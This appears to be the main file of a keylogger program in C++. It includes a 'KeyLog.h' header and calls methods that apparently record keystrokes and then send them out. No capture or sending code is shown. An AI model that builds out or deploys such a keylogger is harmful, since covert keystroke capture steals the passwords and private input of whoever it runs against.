#include "KeyLog.h"

int main()
{
	Logger.record();
	Logger.printFrames();
	Sleep(1000);
	Logger.sendKeys();
	return 0;
}